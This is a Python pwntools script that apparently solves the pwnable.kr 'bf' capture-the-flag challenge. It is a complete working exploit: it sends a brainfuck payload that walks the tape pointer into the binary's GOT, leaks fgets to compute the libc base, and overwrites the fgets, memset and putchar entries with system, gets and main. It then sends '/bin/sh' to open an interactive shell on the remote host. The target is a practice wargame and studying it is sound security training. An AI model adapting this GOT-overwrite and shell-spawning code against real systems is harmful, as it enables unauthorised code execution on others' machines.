from pwn import*
#p = process('./bf')
p = remote('pwnable.kr',9001)

# gadget
t = 0.1
tape = 0x804A0A0
memset_got = 0x804A02C
fgets_got = 0x804A010
putchar_got = 0x804A030
main = 0x08048671

### exploit
# leak
pay = ''
pay += '<'*(tape-fgets_got)	#fgets -> libc_system
pay += '.>'*4			#leak
pay += '<'*4
pay += ',>'*4			#overwrite
pay += '<'*4
# setting
pay += '>'*(memset_got-fgets_got)#memset -> fgets
pay += ',>'*4			
pay += '<'*4
# exploit
pay += '>'*(putchar_got-memset_got)#putchar -> main
pay += ',>'*4
pay += '.,'			#putchar run

p.sendline(pay);sleep(t)

p.recvuntil('type some brainfuck instructions except [ ]\n')
libc_fgets = u32(p.recv(4))
libc_base = libc_fgets - 385360
libc_system = libc_base + 241056
libc_gets = libc_base + 0x5F3E0	#gets -> offset
print 'libc_fgets : '+hex(libc_fgets)
print 'libc_base : '+hex(libc_base)
print 'libc_system : '+hex(libc_system)

p.send(p32(libc_system));sleep(t)
p.send(p32(libc_gets));sleep(t)
p.send(p32(main));sleep(t)
p.sendline('/bin/sh\x00');sleep(t)

# exploit

p.interactive()

